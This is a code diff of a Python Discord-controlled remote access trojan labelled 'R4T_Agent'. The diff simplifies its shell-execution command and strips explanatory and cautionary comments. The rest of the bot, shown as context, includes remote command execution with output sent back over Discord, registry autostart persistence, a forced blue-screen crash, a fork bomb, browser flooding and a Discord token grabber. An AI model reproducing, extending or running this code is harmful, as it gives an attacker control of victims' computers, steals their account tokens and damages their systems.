@@ -161,18 +161,13 @@ Credential Dump:
 """
     await ctx.send(f"```\n{help_text}\n```")
 
-@bot.command(name='exec') # Using 'exec' for broader compatibility with shell commands
-async def execute_command(ctx, *, cmd):
-    try:
-        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        stdout, stderr = process.communicate()
-        output = stdout + stderr
-        if len(output) > 1900:
-            await ctx.send(file=discord.File(io.BytesIO(output.encode()), filename="output.txt"))
-        else:
-            await ctx.send(f"```\n{output}\n```")
-    except Exception as e:
-        await ctx.send(f"Error executing command: {e}")
+@bot.command()
+async def execute(ctx, *, cmd):
+    shell = subprocess.getoutput(cmd)
+    if len(shell) > 1900:
+        await ctx.send(file=discord.File(io.StringIO(shell), filename="QUANTAM.txt"))
+    else:
+        await ctx.send(f"{shell}")
 
 @bot.command(name='cd')
 async def change_directory(ctx, *, path=None):
@@ -221,7 +216,7 @@ async def open_link(ctx, url):
 @bot.command(name='bsod')
 async def trigger_bsod(ctx):
     try:
-        # This will cause a system crash and require a reboot. Use with extreme caution.
+        
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
         ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
         await ctx.send("Attempted to trigger a BSOD. System may restart.")
@@ -231,8 +226,8 @@ async def trigger_bsod(ctx):
 @bot.command(name='startup')
 async def add_startup(ctx):
     try:
-        # Adds the current script to Windows registry for autostart.
-        # Ensure you have a reliable way to remove this if needed.
+        
+        
         reg_command = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "R4T_Agent" /t REG_SZ /d "{sys.executable}" /f'
         subprocess.run(reg_command, shell=True, check=True)
         await ctx.send("Added to Windows autostart.")
@@ -262,7 +257,7 @@ async def download_file(ctx, *, file_path: str):
 @bot.command(name='xfreecrash')
 async def xfree_crash(ctx):
     try:
-        for _ in range(10): # Open a few times, then let it run
+        for _ in range(10): 
             webbrowser.open("https://xfree.com")
             await asyncio.sleep(1)
         await ctx.send("Opened xfree.com multiple times. Browser might become unresponsive.")
@@ -295,7 +290,7 @@ async def set_wallpaper(ctx):
             # SPIF_SENDCHANGE = 2
             ctypes.windll.user32.SystemParametersInfoW(20, 0, save_path, 3)
             await ctx.send("Wallpaper set successfully.")
-            # Clean up the temporary file
+            
             os.remove(save_path)
         except Exception as e:
             await ctx.send(f"Error setting wallpaper: {e}")
@@ -316,8 +311,8 @@ async def public_ip(ctx):
 async def fork_bomb(ctx):
     try:
         await ctx.send("Initiating fork bomb (may cause system instability).")
-        # This is a simplified fork bomb, actual ones are more aggressive.
-        # It opens new CMD windows rapidly.
+        
+        
         while True:
             try:
                 subprocess.Popen("start cmd", shell=True)
@@ -447,10 +442,10 @@ async def grab_discord_tokens(ctx):
     await ctx.send("Grabbing Discord tokens...")
     try:
         token_grabber_func = getattr(credential.main, "main")
-        token_grabber_func() # Assuming this function handles the dumping and saving
+        token_grabber_func() 
         await ctx.send("Token grabbing process initiated. Check output files.")
-        # You might want to upload the collected tokens if the main() function saves them to a file
-        # Example: await ctx.send(file=discord.File("collected_tokens.txt"))
+        
+        
     except AttributeError:
         await ctx.send("Error: Token grabber function not found in credential.main module.")
     except Exception as e:
@@ -552,24 +547,24 @@ async def list_directory(ctx):
     except Exception as e:
         await ctx.send(f"💀 Error reading directory: {e}")
 
-# Keep-alive loop to ensure the bot stays running
+
 async def keep_alive():
     """A simple task to prevent the bot from idling indefinitely."""
     while True:
-        await asyncio.sleep(60) # Check every minute
+        await asyncio.sleep(60) 
 
 async def main():
     """Main function to run the bot."""
-    # The bot.run() method should be the last thing called in the main execution flow
-    # that is directly tied to starting the bot's connection.
+    
+    
     async with bot:
-        # Start the keep_alive task if needed (though bot.run handles keeping it alive)
-        # bot.loop.create_task(keep_alive()) # Usually not needed with async with bot:
+        
+        
         await bot.start(token)
 
 if __name__ == "__main__":
     try:
-        # asyncio.run(main()) handles the event loop setup and shutdown
+        
         asyncio.run(main())
     except KeyboardInterrupt:
         print("Bot stopped manually.")
